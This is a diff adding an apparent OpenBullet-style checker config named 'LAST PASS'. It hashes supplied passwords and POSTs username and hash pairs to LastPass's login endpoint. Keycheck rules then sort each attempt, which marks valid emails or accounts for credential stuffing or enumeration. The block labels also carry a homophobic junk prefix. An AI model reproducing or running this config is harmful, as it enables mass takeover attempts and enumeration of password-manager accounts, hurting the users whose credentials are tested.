@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "LAST PASS",
+  "SuggestedBots": 1,
+  "LastModified": "2018-07-04T06:08:47.8606716+00:00",
+  "AdditionalInfo": "",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#HomoSexualPantherMAGICAN FUNCTION Hash SHA256 "<PASS>" -> VAR "HASH" 
+#HomoSexualPantherPOST REQUEST POST "https://lastpass.com/login.php" AutoRedirect=TRUE 
+  CONTENT "sentms=1&canexpire=1&cansetuuid=1&xml=2&username=<USER>&method=ff&hash=<HASH>&version=4.10.1&uuid=null&lang=en-US&iterations=5000&sessonly=0&otp=&sesameotp=&multifactorresponse=&outofbandsupported=1&lostpwotphash=&requestsrc=cr&hasplugin=4.10.1&lpversion=4.10.1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#HomoSexualPantherMINESWEEPER KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Unknown email address.\"" 
+  KEYCHAIN Success OR 
+    KEY "unknownpassword" 
